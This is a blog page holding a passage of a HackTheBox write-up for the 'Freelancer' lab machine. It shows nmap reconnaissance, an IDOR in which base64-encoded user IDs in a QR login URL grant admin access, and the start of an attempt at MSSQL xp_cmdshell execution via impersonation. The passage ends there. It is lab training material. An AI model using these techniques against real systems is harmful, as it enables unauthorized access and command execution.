<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://foued-saidi.tech/2024/10/04/hackthebox-freelancer/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewFreelaner is a hard-difficulty windows machine on HackTheBox, dealing initially with exploiting an IDOR vulnerability to get admin access on the dashboard followed by abusing user impersonatio">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackthebox: Freelancer">
<meta property="og:url" content="http://foued-saidi.tech/2024/10/04/Hackthebox-Freelancer/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewFreelaner is a hard-difficulty windows machine on HackTheBox, dealing initially with exploiting an IDOR vulnerability to get admin access on the dashboard followed by abusing user impersonatio">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/Freelancer.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/web-app-80.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/employer1.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/employer2.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/employer3.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/employer4.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/employer5.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/qr.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/qr1.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/qr2.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/mssq1.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/mssq2.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/mssq4.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/privsec.png">
<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/privsec1.png">
<meta property="article:published_time" content="2024-10-04T16:17:18.000Z">
<meta property="article:modified_time" content="2024-10-05T17:50:20.000Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/Freelancer/Freelancer.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Hackthebox: Freelancer -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Freelancer</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-10-04 17:17:18</span>
        <span class="mobile">2024-10-04 17:17:18</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-10-05 18:50:20</span>
            <span class="mobile">2024-10-05 18:50:20</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Freelaner is a hard-difficulty windows machine on HackTheBox, dealing initially with exploiting an IDOR vulnerability to get admin access on the dashboard followed by abusing user impersonation on MSSQL server to gain command execution using xp_cmdshell. Later analyzing a windows datacenter memory dump with MemProcFS to gain another user credentials and abuse Resource Based Constrained Delegation.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/Freelancer.png"
                      alt="Freelancer-info-card"
                ><figcaption>Freelancer-info-card</figcaption></figure></p>
<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">9.24</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-09-20</span> <span class="number">19</span>:<span class="number">27</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.3230</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Stats: <span class="number">0</span>:<span class="number">00</span>:<span class="number">04</span> elapsed; <span class="number">0</span> hosts completed (<span class="number">1</span> up), <span class="number">1</span> undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About <span class="number">2.10</span>% done; ETC: <span class="number">19</span>:<span class="number">27</span> (<span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span> remaining)</span><br><span class="line">Stats: <span class="number">0</span>:<span class="number">00</span>:<span class="number">04</span> elapsed; <span class="number">0</span> hosts completed (<span class="number">1</span> up), <span class="number">1</span> undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About <span class="number">3.20</span>% done; ETC: <span class="number">19</span>:<span class="number">27</span> (<span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span> remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">9.24</span></span><br><span class="line">Host is up (<span class="number">0.11</span>s latency).</span><br><span class="line">Not shown: <span class="number">988</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp   open  domain        Simple DNS Plus</span><br><span class="line"><span class="number">80</span>/tcp   open  http          nginx <span class="number">1.25</span>.<span class="number">5</span></span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://freelancer.htb/</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.25</span>.<span class="number">5</span></span><br><span class="line"><span class="number">88</span>/tcp   open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2024</span><span class="literal">-09-20</span> <span class="number">23</span>:<span class="number">30</span>:<span class="number">45</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp  open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line"><span class="number">3269</span>/tcp open  tcpwrapped</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="keyword">If</span> you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=<span class="number">7.93</span>%E=<span class="number">4</span>%D=<span class="number">9</span>/<span class="number">20</span>%OT=<span class="number">53</span>%CT=<span class="number">1</span>%CU=<span class="number">34240</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">66</span>EDBEB</span><br><span class="line">OS:B%P=i686<span class="literal">-pc-windows-windows</span>)SEQ(<span class="built_in">SP</span>=FE%GCD=<span class="number">1</span>%ISR=<span class="number">107</span>%TI=I%CI=I%<span class="built_in">II</span>=I%SS=S%</span><br><span class="line">OS:TS=U)SEQ(<span class="built_in">SP</span>=FE%GCD=<span class="number">1</span>%ISR=<span class="number">107</span>%TI=<span class="built_in">RD</span>%CI=I%<span class="built_in">II</span>=I%TS=U)OPS(O1=M54ENW8NNS%O2=M</span><br><span class="line">OS:<span class="number">54</span>ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)WIN(W1=FFFF%</span><br><span class="line">OS:W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">80</span>%W=FFFF%O=M54EN</span><br><span class="line">OS:W8NNS%CC=Y%Q=)T1(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">80</span>%S=O%A=S+%F=AS%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T2(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">80</span>%W=</span><br><span class="line">OS:<span class="number">0</span>%S=Z%A=S%F=AR%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T3(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=Z%A=O%F=AR%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T</span><br><span class="line">OS:<span class="number">4</span>(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=A%A=O%F=<span class="built_in">R</span>%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T5(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=Z%A=S+</span><br><span class="line">OS:%F=AR%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T6(<span class="built_in">R</span>=Y%DF=Y%T=<span class="number">80</span>%W=<span class="number">0</span>%S=A%A=O%F=<span class="built_in">R</span>%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)T7(<span class="built_in">R</span>=Y%DF=Y</span><br><span class="line">OS:%T=<span class="number">80</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%<span class="built_in">RD</span>=<span class="number">0</span>%Q=)U1(<span class="built_in">R</span>=Y%DF=N%T=<span class="number">80</span>%IPL=<span class="number">164</span>%UN=<span class="number">0</span>%RIPL=G%</span><br><span class="line">OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(<span class="built_in">R</span>=Y%DFI=N%T=<span class="number">80</span>%<span class="built_in">CD</span>=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2024</span><span class="literal">-09-20T23</span>:<span class="number">31</span>:<span class="number">08</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2<span class="literal">-security-mode</span>:</span><br><span class="line">|   <span class="number">311</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: <span class="number">5</span>h03m22s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port 1723/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">173.00</span> ms <span class="number">10.10</span>.<span class="number">16.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">67.00</span> ms  <span class="number">10.129</span>.<span class="number">9.24</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">63.03</span> seconds</span><br></pre></td></tr></table></figure></div>

<p>We can see that port 80 is redirecting us to <code>http://freelancer.htb/</code>, so let’s add that entry to our <code>/etc/hosts</code> file.</p>
<h3 id="Web-Application-http-freelancer-htb"><a href="#Web-Application-http-freelancer-htb" class="headerlink" title="Web Application - http://freelancer.htb/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://freelancer.htb/" >http://freelancer.htb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/web-app-80.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>We can see that this is a casual web app with a login and registration feastures. We can register ourselves both as a <code>Freelancer</code> or <code>Employer</code>.</p>
<h4 id="Employer-Account-Registration"><a href="#Employer-Account-Registration" class="headerlink" title="Employer Account Registration"></a>Employer Account Registration</h4><p>At first, the app tells us our account won’t be active upon creation:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/employer1.png"
                      alt="Employer Registration"
                ><figcaption>Employer Registration</figcaption></figure></p>
<p>And yes, once we try to login we’ll not be able to authenticate:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/employer2.png"
                      alt="Employer Registration"
                ><figcaption>Employer Registration</figcaption></figure></p>
<p>Taking a look at the <code>Forgot Password</code> feature, I try to reset my password entering my details first (I thought of this after exhausting all other though and trials to access the dashboard):<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/employer3.png"
                      alt="Employer Registration"
                ><figcaption>Employer Registration</figcaption></figure></p>
<p>Then we are asked to change our password:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/employer4.png"
                      alt="Employer Registration"
                ><figcaption>Employer Registration</figcaption></figure></p>
<p>After changing my password and trying to login again, I don’t get the authentication error and I’m in:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/employer5.png"
                      alt="Employer Registration"
                ><figcaption>Employer Registration</figcaption></figure></p>
<h4 id="QR-Code-Manipulation"><a href="#QR-Code-Manipulation" class="headerlink" title="QR Code Manipulation"></a>QR Code Manipulation</h4><p>One feature that intrigued me was the QR-Coe one:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/qr.png"
                      alt="QR Code"
                ><figcaption>QR Code</figcaption></figure></p>
<p>Scanning the provided QR, I get this URL: <code>http://freelancer.htb/accounts/login/otp/MTAwMTA=/1d3b89a43cc2ba9d0fd838ad1ef4dcea/</code><br>One thing I suspected is that “MTAwMTA&#x3D;” looked like some base64 encoded string, I decode it and it give me the number “10010” which looks like some user id.<br>I honestly was so lazy to create another user and validate it to check if the user id theory was correct. So I just assumed it is haha.</p>
<p>Therefore I tried different user id to try and reach an admin id. Trying the base64 value for id “1” gives me an <code>Internal Server Error 500</code>, as where the base64 value for id “2” returns this message:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/qr1.png"
                      alt="QR Code"
                ><figcaption>QR Code</figcaption></figure></p>
<p>But I was doing it really slow, so let’s re-do it more quickly:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/qr2.png"
                      alt="Admin Access"
                ><figcaption>Admin Access</figcaption></figure></p>
<p>(PS: the base64 value for the id “2” is <code>Mgo=</code> - it’s the only value that worked for me)</p>
<h4 id="MSSQL-Exploitation-http-freelancer-htb-admin"><a href="#MSSQL-Exploitation-http-freelancer-htb-admin" class="headerlink" title="MSSQL Exploitation - http://freelancer.htb/admin/"></a>MSSQL Exploitation - <a class="link"   target="_blank" rel="noopener" href="http://freelancer.htb/admin/" >http://freelancer.htb/admin/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/mssq1.png"
                      alt="MSSQL Abuse"
                ><figcaption>MSSQL Abuse</figcaption></figure></p>
<p>Seeing that we are on a windows box, I immediately thought of MSSQL as the database management service. One thing I can do is try and enable <code>xp_cmdshell</code> on mssql to execute commands:</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Freelancer/mssq2.png"
                      alt="MSSQL Abuse"
                ><figcaption>MSSQL Abuse</figcaption></figure></p>
<p>But we can see it failed due to lack of permissions. I thne immediately thought of <a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users" >this HackTricks article <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> where we’ll be trying to impersonate <code>sysadmin</code> user:</p>
